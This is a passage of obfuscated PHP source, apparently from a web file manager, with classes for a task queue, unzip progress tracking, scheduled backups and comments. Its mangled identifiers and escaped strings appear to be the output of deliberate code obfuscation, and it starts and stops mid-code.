$_SERVER[©—Ò»ÅĞ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($áå‘çÇ && array_find_by_field(self::$listData, $Àù „ò[95], $áå‘çÇ)) { return !0; } if ($áå‘çÇ && array_find_by_field(self::$listDataAdd, $Àù „ò[95], $áå‘çÇ)) { return !0; } self::$listDataAdd[] = array($Àù „ò[342] => $«¹Ãê”, $Àù „ò[2085] => $î‚š÷Ü, $Àù „ò[540] => $‹¡„ŸÆÈ, $Àù „ò[95] => $áå‘çÇ); return !0; } public static function addSubmit() { $×ÓŒ«‘‹ =& $_SERVER[©—Ò»ÅĞ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($×ÓŒ«‘‹[2086] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $×ÓŒ«‘‹[12], $×ÓŒ«‘‹[540])), $×ÓŒ«‘‹[195]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($şˆ²Şö÷, $ª«é²Í¨ = array(), $½õÉöÆ = '', $ìªàäã” = '') { $¥ÁË˜‡ƒ =& $_SERVER[©—Ò»ÅĞ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ôĞµÚ€× = self::getAll(); if ($ìªàäã” && array_find_by_field($ôĞµÚ€×, $¥ÁË˜‡ƒ[95], $ìªàäã”)) { return !0; } $ôĞµÚ€×[] = array($¥ÁË˜‡ƒ[342] => $şˆ²Şö÷, $¥ÁË˜‡ƒ[2085] => $ª«é²Í¨, $¥ÁË˜‡ƒ[540] => $½õÉöÆ, $¥ÁË˜‡ƒ[95] => $ìªàäã”); self::setAll($ôĞµÚ€×); write_log($¥ÁË˜‡ƒ[2086] . $½õÉöÆ, $¥ÁË˜‡ƒ[195]); return !0; } public static function run() { $çÍ—şªé =& $_SERVER[©—Ò»ÅĞ]; $¼¨¼”“ = self::getAll(); $³ö ¤Ø = array_shift($¼¨¼”“); if (!$³ö ¤Ø) { return !1; } self::setAll($¼¨¼”“); $¼ä…¤ = timeFloat(); $…¸äı¸ = $çÍ—şªé[12]; try { $…¸äı¸ = Hook::apply($³ö ¤Ø[$çÍ—şªé[342]], $³ö ¤Ø[$çÍ—şªé[2085]]); } catch (Exception $¿şúºˆ–) { write_log($¿şúºˆ–, $çÍ—şªé[1371]); } $¤¶ôğ°  = number_format(timeFloat() - $¼ä…¤, 3) . $çÍ—şªé[1993]; if ($…¸äı¸ && is_string($…¸äı¸)) { $¤¶ôğ°  = $¤¶ôğ°  . $çÍ—şªé[2087] . $…¸äı¸; } write_log($çÍ—şªé[2088] . $³ö ¤Ø[$çÍ—şªé[540]] . $çÍ—şªé[2089] . $¤¶ôğ° , $çÍ—şªé[195]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ï¿Œ“·€ =& $_SERVER[©—Ò»ÅĞ]; $ÃÍÙ‰€ = self::threadCount() + 1; if ($ÃÍÙ‰€ > 3 || !self::count()) { return; } write_log($ï¿Œ“·€[2090] . $ÃÍÙ‰€, $ï¿Œ“·€[195]); Cache::set(self::QUEUE_THREAD, $ÃÍÙ‰€, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ï¿Œ“·€[2091], $ï¿Œ“·€[195]); } public static function getKey($¾““ıÂÖ, $‘•àÓğó = "\x69\156\164") { $âÃÉäµË =& $_SERVER[©—Ò»ÅĞ]; Cache::removeMemory($¾““ıÂÖ); $ÇŸóüØö = Cache::get($¾““ıÂÖ); if ($‘•àÓğó == $âÃÉäµË[364]) { return $ÇŸóüØö ? intval($ÇŸóüØö) : 0; } if ($‘•àÓğó == $âÃÉäµË[2092]) { return is_array($ÇŸóüØö) ? $ÇŸóüØö : array(); } return $ÇŸóüØö; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[©—Ò»ÅĞ][2092]); } public static function setAll($œ—¯¼çâ) { $ËÚ±¾º¹ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($œ—¯¼çâ), $ËÚ±¾º¹); Cache::set(self::QUEUE_DATA, $œ—¯¼çâ, $ËÚ±¾º¹); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($›¦Úğğ, $‰¯ƒ×’ = 5.0) { if (!$›¦Úğğ) { return; } $íÎÇ«ëÉ = Cache::get($›¦Úğğ); if (!$íÎÇ«ëÉ || timeFloat() - floatVal($íÎÇ«ëÉ) >= $‰¯ƒ×’) { Cache::set($›¦Úğğ, timeFloat(), $‰¯ƒ×’ * 10); return !0; } return !1; } public static function timeLimitCall($­—¬¡•ç, $áÁÊ»¸, $–ÀãÖ«ã, $¶ï¬ƒˆ¬ = 5.0) { $ö¶”±± =& $_SERVER[©—Ò»ÅĞ]; if (!$­—¬¡•ç || !$áÁÊ»¸) { return; } self::$asyncAdd = !0; $Ñ‰¥‡Í¨ = $ö¶”±±[2093]; $Ëé•ß’Ê = Cache::get($Ñ‰¥‡Í¨, !0); $åÂÆ…é´ = array($ö¶”±±[2094] => timeFloat(), $ö¶”±±[2095] => timeFloat(), $ö¶”±±[342] => $áÁÊ»¸, $ö¶”±±[2085] => $–ÀãÖ«ã, $ö¶”±±[2096] => $¶ï¬ƒˆ¬); if (is_array($Ëé•ß’Ê[$­—¬¡•ç])) { if (timeFloat() - $Ëé•ß’Ê[$­—¬¡•ç][$ö¶”±±[2094]] <= $åÂÆ…é´[$ö¶”±±[2096]] * 0.5) { return; } $åÂÆ…é´[$ö¶”±±[2095]] = $Ëé•ß’Ê[$­—¬¡•ç][$ö¶”±±[2095]]; } $Ëé•ß’Ê[$­—¬¡•ç] = $åÂÆ…é´; Cache::set($Ñ‰¥‡Í¨, $Ëé•ß’Ê, 60); Cache::removeMemory($Ñ‰¥‡Í¨); write_log($ö¶”±±[2097] . $­—¬¡•ç . $ö¶”±±[74] . $áÁÊ»¸ . $ö¶”±±[2098] . ACTION, $ö¶”±±[195]); } public static function timeLimitCallLoop() { $ØèùË×û =& $_SERVER[©—Ò»ÅĞ]; $šçŸëÄ™ = array($ØèùË×û[2099]); $Ô¦‰±¥æ = in_array(strtolower(ACTION), $šçŸëÄ™); if (!$Ô¦‰±¥æ && !self::$asyncAdd) { return; } $şÂ‚øô¸ = $ØèùË×û[2093]; $§ê…‘Ùš = Cache::get($şÂ‚øô¸, !0); if (!$§ê…‘Ùš || count($§ê…‘Ùš) <= 0) { return; } $ÉûŸ³… = timeFloat(); $œÓµ Ù = array(); $±ŠêöÒ« = array(); foreach ($§ê…‘Ùš as $’”ÍÁĞ => $šö†Ø“ß) { if ($ÉûŸ³… - $šö†Ø“ß[$ØèùË×û[2095]] > $šö†Ø“ß[$ØèùË×û[2096]]) { $±ŠêöÒ«[$’”ÍÁĞ] = $šö†Ø“ß; continue; } $œÓµ Ù[$’”ÍÁĞ] = $šö†Ø“ß; } if (count($±ŠêöÒ«) == 0) { return; } if (count($œÓµ Ù) == 0) { Cache::remove($şÂ‚øô¸); } else { Cache::set($şÂ‚øô¸, $œÓµ Ù, 60); } Cache::removeMemory($şÂ‚øô¸); self::runArr($±ŠêöÒ«); } public static function finished($°À¥ê½, $ƒêõÔº‰) { $Ó§§Ã’ =& $_SERVER[©—Ò»ÅĞ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Ó§§Ã’[342] => $°À¥ê½, $Ó§§Ã’[2085] => $ƒêõÔº‰); } private static function runArr($––Ó•ˆ›) { $ÚÖ³òÊõ =& $_SERVER[©—Ò»ÅĞ]; if (!$––Ó•ˆ›) { return; } foreach ($––Ó•ˆ› as $ø½å»å => $şêÂ„æÒ) { try { Hook::apply($şêÂ„æÒ[$ÚÖ³òÊõ[342]], $şêÂ„æÒ[$ÚÖ³òÊõ[2085]]); write_log($ÚÖ³òÊõ[2100] . $ø½å»å . $ÚÖ³òÊõ[74] . $şêÂ„æÒ[$ÚÖ³òÊõ[342]] . $ÚÖ³òÊõ[2098] . ACTION, $ÚÖ³òÊõ[195]); } catch (Exception $‹áæ™Ñ×) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $êŒÎ¼Ô =& $_SERVER[©—Ò»ÅĞ]; parent::startAfter(); Hook::bind($êŒÎ¼Ô[2101], array($this, $êŒÎ¼Ô[2102])); Hook::bind($êŒÎ¼Ô[1384], array($this, $êŒÎ¼Ô[2103])); Hook::bind($êŒÎ¼Ô[2104], array($this, $êŒÎ¼Ô[2105])); $‹¯ú¡Çã =& $this->task; $‹¯ú¡Çã[$êŒÎ¼Ô[2106]] = $êŒÎ¼Ô[1385]; if (!$‹¯ú¡Çã[$êŒÎ¼Ô[1865]]) { $‹¯ú¡Çã[$êŒÎ¼Ô[1865]] = LNG($êŒÎ¼Ô[2107]); } } protected function endAfter() { $Àì²©Ø¿ =& $_SERVER[©—Ò»ÅĞ]; parent::endAfter(); Hook::unbind($Àì²©Ø¿[2101], array($this, $Àì²©Ø¿[2102])); Hook::unbind($Àì²©Ø¿[1384], array($this, $Àì²©Ø¿[2103])); Hook::unbind($Àì²©Ø¿[2104], array($this, $Àì²©Ø¿[2105])); } public function updateAfter() { $ÂŠİÍ =& $_SERVER[©—Ò»ÅĞ]; $âà€‘‹€ =& $this->task; if (!$âà€‘‹€[$ÂŠİÍ[1232]] || !$âà€‘‹€[$ÂŠİÍ[864]]) { if ($âà€‘‹€[$ÂŠİÍ[2106]] != $ÂŠİÍ[388]) { return; } } if ($âà€‘‹€[$ÂŠİÍ[2106]] == $ÂŠİÍ[1385]) { $ö®ÜÑÑ = 0; if ($âà€‘‹€[$ÂŠİÍ[2031]]) { $ö®ÜÑÑ = $âà€‘‹€[$ÂŠİÍ[2032]] / $âà€‘‹€[$ÂŠİÍ[2031]]; } $âà€‘‹€[$ÂŠİÍ[1979]] = $ö®ÜÑÑ * 0.3; } else { if ($âà€‘‹€[$ÂŠİÍ[2106]] == $ÂŠİÍ[388]) { $ö®ÜÑÑ = $âà€‘‹€[$ÂŠİÍ[1978]] / $âà€‘‹€[$ÂŠİÍ[1232]]; $âà€‘‹€[$ÂŠİÍ[1979]] = 0.3 + $ö®ÜÑÑ * 0.4; } else { if ($âà€‘‹€[$ÂŠİÍ[2106]] == $ÂŠİÍ[107]) { $Œ”ãˆ¤õ = 0; if ($âà€‘‹€[$ÂŠİÍ[2033]] == $ÂŠİÍ[107]) { $Œ”ãˆ¤õ = $âà€‘‹€[$ÂŠİÍ[2032]]; } $ö®ÜÑÑ = ($âà€‘‹€[$ÂŠİÍ[941]] + $Œ”ãˆ¤õ) / $âà€‘‹€[$ÂŠİÍ[864]]; $âà€‘‹€[$ÂŠİÍ[1979]] = 0.3 + 0.4 + $ö®ÜÑÑ * 0.3; } } } if ($âà€‘‹€[$ÂŠİÍ[1979]] > 0) { $êè–‹¹¬ = timeFloat() - $âà€‘‹€[$ÂŠİÍ[1981]] - $âà€‘‹€[$ÂŠİÍ[1984]]; $âà€‘‹€[$ÂŠİÍ[1985]] = $êè–‹¹¬ * (1 - $âà€‘‹€[$ÂŠİÍ[1979]]) / $âà€‘‹€[$ÂŠİÍ[1979]]; } } public function addFile($İ§Õ¸Ö) { $ÂÀğÅå« =& $_SERVER[©—Ò»ÅĞ]; $¯ØÜŞå =& $this->task; $ÆÕ´¤Ëè = IO::info($İ§Õ¸Ö); $¯ØÜŞå[$ÂÀğÅå«[2029]] = $ÆÕ´¤Ëè[$ÂÀğÅå«[32]]; $¯ØÜŞå[$ÂÀğÅå«[2031]] = $ÆÕ´¤Ëè[$ÂÀğÅå«[79]]; $¯ØÜŞå[$ÂÀğÅå«[2032]] = 0; $¯ØÜŞå[$ÂÀğÅå«[1234]] = $ÂÀğÅå«[2059]; $¯ØÜŞå[$ÂÀğÅå«[2033]] = $ÂÀğÅå«[1385]; $¯ØÜŞå[$ÂÀğÅå«[864]] = $ÆÕ´¤Ëè[$ÂÀğÅå«[79]]; $¯ØÜŞå[$ÂÀğÅå«[1232]] = 1; $ÉŠá« = 0; $¯ØÜŞå[$ÂÀğÅå«[2041]] = array($ÂÀğÅå«[2042] => $ÉŠá« + 1, $ÂÀğÅå«[509] => $ÆÕ´¤Ëè[$ÂÀğÅå«[32]], $ÂÀğÅå«[87] => $ÆÕ´¤Ëè[$ÂÀğÅå«[87]], $ÂÀğÅå«[602] => $ÆÕ´¤Ëè[$ÂÀğÅå«[602]] ? $ÆÕ´¤Ëè[$ÂÀğÅå«[602]] : $ÆÕ´¤Ëè[$ÂÀğÅå«[87]]); $this->update(); } public function zipEvent($ÓæŸ€Ë˜, $—¯Àãô£, $¯¸Îõò, $³å½‡û) { $£€›„º‹ =& $_SERVER[©—Ò»ÅĞ]; $½ùŞ”÷è =& $this->task; $½ùŞ”÷è[$£€›„º‹[2029]] = get_path_this($—¯Àãô£); $½ùŞ”÷è[$£€›„º‹[2031]] = $³å½‡û; $½ùŞ”÷è[$£€›„º‹[2032]] = $¯¸Îõò; $½ùŞ”÷è[$£€›„º‹[1234]] = $ÓæŸ€Ë˜ == $£€›„º‹[2108] ? $£€›„º‹[2109] : $£€›„º‹[2110]; $½ùŞ”÷è[$£€›„º‹[2033]] = $£€›„º‹[12]; $½ùŞ”÷è[$£€›„º‹[864]] = $³å½‡û; $½ùŞ”÷è[$£€›„º‹[2106]] = $£€›„º‹[388]; $this->update(); } public function unzipAfter($øËÀøøô) { $¿ëáÀÜƒ =& $_SERVER[©—Ò»ÅĞ]; $Ë†ì«¥Ì =& $this->task; $Ë†ì«¥Ì[$¿ëáÀÜƒ[2106]] = $¿ëáÀÜƒ[107]; $ë›¿Û‰Š = IO::infoWithChildren($øËÀøøô); $›üòÀÇè = 0; $Ë†ì«¥Ì[$¿ëáÀÜƒ[2041]] = array($¿ëáÀÜƒ[2042] => $›üòÀÇè + 1, $¿ëáÀÜƒ[509] => $ë›¿Û‰Š[$¿ëáÀÜƒ[32]], $¿ëáÀÜƒ[87] => $ë›¿Û‰Š[$¿ëáÀÜƒ[87]], $¿ëáÀÜƒ[602] => $ë›¿Û‰Š[$¿ëáÀÜƒ[602]] ? $ë›¿Û‰Š[$¿ëáÀÜƒ[602]] : $ë›¿Û‰Š[$¿ëáÀÜƒ[87]]); if ($ë›¿Û‰Š[$¿ëáÀÜƒ[33]] == $¿ëáÀÜƒ[230]) { $Ë†ì«¥Ì[$¿ëáÀÜƒ[1232]] = 1; } else { $Ë†ì«¥Ì[$¿ëáÀÜƒ[1232]] = $ë›¿Û‰Š[$¿ëáÀÜƒ[82]][$¿ëáÀÜƒ[80]]; } $Ë†ì«¥Ì[$¿ëáÀÜƒ[1234]] = $¿ëáÀÜƒ[12]; $Ë†ì«¥Ì[$¿ëáÀÜƒ[2033]] = 0; $Ë†ì«¥Ì[$¿ëáÀÜƒ[1978]] = 0; $Ë†ì«¥Ì[$¿ëáÀÜƒ[2031]] = 0; $Ë†ì«¥Ì[$¿ëáÀÜƒ[2032]] = 0; $Ë†ì«¥Ì[$¿ëáÀÜƒ[2029]] = $¿ëáÀÜƒ[12]; $Ë†ì«¥Ì[$¿ëáÀÜƒ[941]] = 0; $Ë†ì«¥Ì[$¿ëáÀÜƒ[864]] = $ë›¿Û‰Š[$¿ëáÀÜƒ[79]]; $this->update(); self::log($¿ëáÀÜƒ[2111] . json_encode(array($Ë†ì«¥Ì, $ë›¿Û‰Š))); } public function nameParse($†ÒãºŸ) { $¥¢ŸØ¯¸ =& $_SERVER[©—Ò»ÅĞ]; $†Ô™ì¸à =& $this->task; if ($†Ô™ì¸à[$¥¢ŸØ¯¸[2106]] == $¥¢ŸØ¯¸[1385]) { $†Ô™ì¸à[$¥¢ŸØ¯¸[2106]] = $¥¢ŸØ¯¸[388]; $†Ô™ì¸à[$¥¢ŸØ¯¸[941]] = 0; $†Ô™ì¸à[$¥¢ŸØ¯¸[864]] = 0; } $ÓĞí†»ä = get_path_this($†ÒãºŸ); if (strstr($ÓĞí†»ä, $¥¢ŸØ¯¸[10])) { $†Ô™ì¸à[$¥¢ŸØ¯¸[1978]] += 1; $†Ô™ì¸à[$¥¢ŸØ¯¸[1232]] += 1; } $†Ô™ì¸à[$¥¢ŸØ¯¸[2029]] = $†ÒãºŸ; $this->update(); } } goto B¹ëõ¢ï; fõ”¬Ñ¬‰¬: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\x2e\x62\141\143\153\165\160\x4c\x69\x73\x74"; public $field = array("\151\157", "\156\x61\155\145", "\163\x74\141\x74\165\163", "\x63\157\156\x74\x65\156\164", "\155\x61\x6e\165\141\x6c", "\162\x65\x73\x75\154\x74", "\x74\x69\155\145\106\x72\x6f\155", "\x74\151\155\x65\124\157"); public $autoTask = "\x61\144\155\151\x6e\x2e\142\x61\x63\x6b\x75\x70\56\141\x75\164\157\124\x61\x73\x6b"; public $fileTask = "\141\144\155\151\x6e\56\142\141\143\x6b\165\x70\x2e\x66\x69\x6c\145\x54\x61\163\x6b"; public function config($İÓÔùŸ = false) { $‚­¼¢Úâ =& $_SERVER[©—Ò»ÅĞ]; $ó„òüÀû = $this->configSimple(); Action($‚­¼¢Úâ[2206])->taskInit($ó„òüÀû); if (!$İÓÔùŸ) { return $ó„òüÀû; } $‰€ËøåÂ = array(); if (Model($‚­¼¢Úâ[873])->get($‚­¼¢Úâ[2207], $‚­¼¢Úâ[879]) == $‚­¼¢Úâ[2208]) { Model($‚­¼¢Úâ[1947])->cacheClear(); $‰€ËøåÂ = Model($‚­¼¢Úâ[2209])->findByKey($‚­¼¢Úâ[1563], $this->autoTask); if (!$‰€ËøåÂ) { $‰€ËøåÂ = array(); } if (isset($‰€ËøåÂ[$‚­¼¢Úâ[204]])) { $‰€ËøåÂ[$‚­¼¢Úâ[204]] = json_decode($‰€ËøåÂ[$‚­¼¢Úâ[204]], !0); } if (isset($ó„òüÀû[$‚­¼¢Úâ[204]])) { $‰€ËøåÂ[$‚­¼¢Úâ[204]][$‚­¼¢Úâ[1951]] = $ó„òüÀû[$‚­¼¢Úâ[204]]; unset($ó„òüÀû[$‚­¼¢Úâ[204]]); } } $ó„òüÀû = array_merge($‰€ËøåÂ, $ó„òüÀû); if ($ó„òüÀû[$‚­¼¢Úâ[168]] == $‚­¼¢Úâ[944]) { $øçøˆİ = Model($‚­¼¢Úâ[873])->get($‚­¼¢Úâ[943], $‚­¼¢Úâ[879]); $ó„òüÀû[$‚­¼¢Úâ[2210]] = json_decode($øçøˆİ, !0); } return $ó„òüÀû; } public function configSimple() { $ìÉÄª£² =& $_SERVER[©—Ò»ÅĞ]; $¹°áÀšÁ = Model($ìÉÄª£²[873])->get($ìÉÄª£²[879]); $¹°áÀšÁ = json_decode($¹°áÀšÁ, !0); if (!$¹°áÀšÁ) { $¹°áÀšÁ = array($ìÉÄª£²[1948] => 0); } $¹°áÀšÁ[$ìÉÄª£²[1948]] = _get($¹°áÀšÁ, $ìÉÄª£²[1948], 1); $this->parseContent($¹°áÀšÁ); if ($¹°áÀšÁ[$ìÉÄª£²[168]] == $ìÉÄª£²[944] && Model($ìÉÄª£²[873])->get($ìÉÄª£²[961]) == $ìÉÄª£²[962]) { $¹°áÀšÁ[$ìÉÄª£²[168]] = $ìÉÄª£²[1308]; } return $¹°áÀšÁ; } public function listData($®Ä¯›¤© = false, $Î©‰ÅÀ = "\155\x6f\144\151\x66\x79\124\x69\x6d\145", $–ê½‹é´ = false) { $Ü›”Ú…ö = parent::listData($®Ä¯›¤©, $Î©‰ÅÀ, !0); if (!$Ü›”Ú…ö) { return $Ü›”Ú…ö; } if ($®Ä¯›¤©) { $Ü›”Ú…ö = array($Ü›”Ú…ö); } foreach ($Ü›”Ú…ö as &$‹ †à„×) { $this->parseContent($‹ †à„×); } return $®Ä¯›¤© ? $Ü›”Ú…ö[0] : $Ü›”Ú…ö; } public function parseContent(&$é¡©µ„) { $³†÷»éû =& $_SERVER[©—Ò»ÅĞ]; $Î¶ŸØ’Õ = _get($é¡©µ„, $³†÷»éû[168], $³†÷»éû[91]); if (!in_array($Î¶ŸØ’Õ, array($³†÷»éû[944], $³†÷»éû[1308]))) { $é¡©µ„[$³†÷»éû[168]] = $Î¶ŸØ’Õ == $³†÷»éû[91] ? $³†÷»éû[1308] : $³†÷»éû[944]; } } public function lastItem() { $ñĞàÊıÄ = $this->listData(); return !empty($ñĞàÊıÄ[0]) ? $ñĞàÊıÄ[0] : null; } public function kill($ÛÈºŞùÛ) { $ˆ“İ ŠÏ =& $_SERVER[©—Ò»ÅĞ]; $óÃÄ˜ÎÏ = $this->listData($ÛÈºŞùÛ); if (!$óÃÄ˜ÎÏ || empty($óÃÄ˜ÎÏ[$ˆ“İ ŠÏ[32]])) { return !0; } Task::kill($ˆ“İ ŠÏ[886]); Task::kill($ˆ“İ ŠÏ[906]); Task::kill($ˆ“İ ŠÏ[917]); $ÚËÀú = $óÃÄ˜ÎÏ[$ˆ“İ ŠÏ[32]]; $Şù·‚¼ë = TEMP_FILES . $ˆ“İ ŠÏ[882] . $ÚËÀú . $ˆ“İ ŠÏ[8]; IO::remove($Şù·‚¼ë, !1); return $this->remove($ÛÈºŞùÛ); } public function remove($îåÓ½ßÓ) { $úÛ§ÏÜ = $this->listData($îåÓ½ßÓ); if (!$úÛ§ÏÜ) { return !0; } return $this->backupRemove($úÛ§ÏÜ); } private function backupRemove($šòØ¢Ü•) { parent::remove($šòØ¢Ü•[$_SERVER[©—Ò»ÅĞ][487]]); $ÒóÏ³€ = $this->backupPath($šòØ¢Ü•); IO::remove($ÒóÏ³€, !1); return !0; } private function backupPath($Óãå¡“¼) { $’¢Ó¨İı =& $_SERVER[©—Ò»ÅĞ]; $™ù š Ê = $Óãå¡“¼[$’¢Ó¨İı[32]]; $Î¢–€Ú¼ = Model($’¢Ó¨İı[873])->get($’¢Ó¨İı[874]); $áßÜì® = substr(md5($’¢Ó¨İı[875] . $Î¢–€Ú¼ . $™ù š Ê), 0, 8); return "\173\x69\x6f\72{$Óãå¡“¼[$’¢Ó¨İı[852]]}\175\x2f\x64\141\164\141\142\x61\163\145\x2f\x62\x61\x63\153\x75\160\57" . $™ù š Ê . $’¢Ó¨İı[11] . $áßÜì®; } public function start($Æœ³¢İ = "\x64\142") { $éç¬À £ =& $_SERVER[©—Ò»ÅĞ]; if ($GLOBALS[$éç¬À £[6]][$éç¬À £[92]][$éç¬À £[2211]] != $éç¬À £[91]) { return !0; } $¼ì³ñË = $this->configSimple(); if (!$¼ì³ñË || $¼ì³ñË[$éç¬À £[1948]] != $éç¬À £[91]) { return !1; } if ($Æœ³¢İ == $éç¬À £[230]) { return $this->bakFile($¼ì³ñË); } $¬Š¹Ì = $this->process(); foreach ($¬Š¹Ì as $Ö¶ÌŒ¤õ) { if ($Ö¶ÌŒ¤õ) { return Task::restart($Ö¶ÌŒ¤õ[$éç¬À £[487]]); } } $»ª…á‡ = new Backup(); if (!$»ª…á‡ || $»ª…á‡->message) { return !1; } $ÛüæÏÍ = $»ª…á‡->db(); if ($ÛüæÏÍ) { $ÛüæÏÍ = $»ª…á‡->dbFile(); if ($ÛüæÏÍ && $¼ì³ñË[$éç¬À £[168]] == $éç¬À £[944]) { $ÛüæÏÍ = $»ª…á‡->file(); } } Backup::set(array($éç¬À £[850] => 1, $éç¬À £[862] => time())); return !0; } public function process() { $¾õÒ›¬Ú =& $_SERVER[©—Ò»ÅĞ]; $‘üŞª = array($¾õÒ›¬Ú[858] => Task::get($¾õÒ›¬Ú[886]), $¾õÒ›¬Ú[863] => Task::get($¾õÒ›¬Ú[906]), $¾õÒ›¬Ú[230] => Task::get($¾õÒ›¬Ú[917])); $“ªÒ¶ˆç = !1; foreach ($‘üŞª as &$çÖ”¢ğ) { if ($“ªÒ¶ˆç) { $çÖ”¢ğ = !1; continue; } if ($çÖ”¢ğ) { $ˆ¸®±ê = intval(_get($çÖ”¢ğ, $¾õÒ›¬Ú[1982], 0)); if (time() - $ˆ¸®±ê > 7200) { Task::kill($çÖ”¢ğ[$¾õÒ›¬Ú[487]]); $“ªÒ¶ˆç = !0; $çÖ”¢ğ = !1; } } } return $‘üŞª; } public function bakFile($ä¯¤÷³†) { $é£Ç±¼õ =& $_SERVER[©—Ò»ÅĞ]; if ($ä¯¤÷³†[$é£Ç±¼õ[168]] == $é£Ç±¼õ[1308]) { return !1; } Model($é£Ç±¼õ[1947])->cacheClear(); $Õ÷Ä·Öó = Model($é£Ç±¼õ[2209])->findByKey($é£Ç±¼õ[1563], $this->fileTask); if (!$Õ÷Ä·Öó) { return !1; } $ü„£ÒÖ¼ = json_decode($Õ÷Ä·Öó[$é£Ç±¼õ[204]], !0); if (!$ü„£ÒÖ¼ || $ü„£ÒÖ¼[$é£Ç±¼õ[33]] != $é£Ç±¼õ[1960]) { return !1; } $ü„£ÒÖ¼ = intval($ü„£ÒÖ¼[$é£Ç±¼õ[1960]]); if ($ü„£ÒÖ¼ <= 0) { return !1; } $Ü†ïÌ®¾ = new BackupFile(!0); return $Ü†ïÌ®¾->start($ä¯¤÷³†[$é£Ç±¼õ[852]], $ü„£ÒÖ¼); } public function restore() { $ÔŸ» ˆÇ =& $_SERVER[©—Ò»ÅĞ]; ActionCall($ÔŸ» ˆÇ[2212], !0, 1); ActionCall($ÔŸ» ˆÇ[2212], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\x65\x6e\164"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\155\x65" => "\143\157\155\x6d\x65\156\x74\x5f\155\x65\x74\x61", "\155\145\164\x61\x46\151\x65\x6c\144" => "\x63\157\155\x6d\145\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¼Œİ®‹¢) { $§Ëøşà« =& $_SERVER[©—Ò»ÅĞ]; if ($¼Œİ®‹¢[$§Ëøşà«[2213]]) { $Ä™ôÈæá = $this->where(array($§Ëøşà«[2214] => $¼Œİ®‹¢[$§Ëøşà«[2213]]))->find(); if (!$Ä™ôÈæá || $Ä™ôÈæá[$§Ëøşà«[188]] != $¼Œİ®‹¢[$§Ëøşà«[188]] || $Ä™ôÈæá[$§Ëøşà«[589]] != $¼Œİ®‹¢[$§Ëøşà«[589]]) { return !1; } $this->where(array($§Ëøşà«[2214] => $¼Œİ®‹¢[$§Ëøşà«[2213]]))->setAdd($§Ëøşà«[2215], 1); } $¼Œİ®‹¢[$§Ëøşà«[2216]] = 0; $¼Œİ®‹¢[$§Ëøşà«[2215]] = 0; $¼Œİ®‹¢[$§Ëøşà«[850]] = 1; return $this->add($¼Œİ®‹¢); } public function commentCount($£—üıÂÜ, $œ­÷ñ, $àÒĞ‘òŞ = false) { $õ°¾¤ó´ =& $_SERVER[©—Ò»ÅĞ]; if (!$£—üıÂÜ) { return array(); } if (is_string($£—üıÂÜ) || is_int($£—üıÂÜ)) { $£—üıÂÜ = array($£—üıÂÜ); } $Æ‚ª¤€Ñ = array($õ°¾¤ó´[589], $õ°¾¤ó´[2217] => $õ°¾¤ó´[585]); $ŞØ…æëÃ = array($õ°¾¤ó´[589] => array($õ°¾¤ó´[7], $£—üıÂÜ), $õ°¾¤ó´[188] => $œ­÷ñ); if ($àÒĞ‘òŞ) { $ŞØ…æëÃ[$õ°¾¤ó´[1592]] = $àÒĞ‘òŞ; } $´Åš™û = $this->field($Æ‚ª¤€Ñ)->where($ŞØ…æëÃ)->group($õ°¾¤ó´[589])->select(); return array_to_keyvalue($´Åš™û, $õ°¾¤ó´[589], $õ°¾¤ó´[585]); } public function starTarget($ò–ü²ÚÌ, $ş¨¶âÚ†) { $ãíã²É¥ =& $_SERVER[©—Ò»ÅĞ]; $¥¤ÄÎõ¹ = $ò–ü²ÚÌ + self::TYPE_STAR_OFFSET; $®ôõÛ½Ø = array($ãíã²É¥[1592] => USER_ID, $ãíã²É¥[188] => $¥¤ÄÎõ¹, $ãíã²É¥[589] => $ş¨¶âÚ†); $¤Ãš® ì = $this->where($®ôõÛ½Ø)->find(); if ($¤Ãš® ì) { return $this->where(array($ãíã²É¥[487] => $¤Ãš® ì[$ãíã²É¥[487]]))->delete(); } $Æàõ®°™ = array($ãíã²É¥[2213] => 0, $ãíã²É¥[1592] => USER_ID, $ãíã²É¥[850] => 1, $ãíã²É¥[168] => $ãíã²É¥[12], $ãíã²É¥[188] => $¥¤ÄÎõ¹, $ãíã²É¥[589] => $ş¨¶âÚ†, $ãíã²É¥[2216] => 0, $ãíã²É¥[2215] => 0); return $this->add($Æàõ®°™); } public function starTargetCount($£¼Í½Æ, $®ÑÅ›—) { $àøçª =& $_SERVER[©—Ò»ÅĞ]; $¥àøÖÃ´ = $®ÑÅ›— + self::TYPE_STAR_OFFSET; $—‡Éè¾ = $this->commentCount($£¼Í½Æ, $¥àøÖÃ´); $ø–Ñˆ•ü = $this->commentCount($£¼Í½Æ, 